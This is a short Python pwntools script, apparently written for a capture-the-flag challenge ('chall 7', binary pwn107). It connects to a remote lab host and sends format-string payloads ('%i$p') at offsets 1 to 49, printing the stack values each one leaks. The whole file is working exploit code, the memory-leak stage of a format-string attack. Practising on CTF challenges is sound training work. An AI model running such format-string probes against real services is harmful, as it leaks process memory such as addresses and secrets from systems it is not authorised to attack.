# For chall 7
from pwn import *

context.log_level = 'error'
for i in range(1, 50):
    # io = process('./pwn107-1644307530397.pwn107')
    io = remote('10.48.184.181', '9007')
    payload = f'%{i}$p' + '\n'
    io.recvuntil(b'streak? ')
    io.sendline(payload)

    io.recvuntil(b': ')
    p = io.recvuntil('\n')
    print(p, i)
    io.sendline(b'A\n')
    io.close()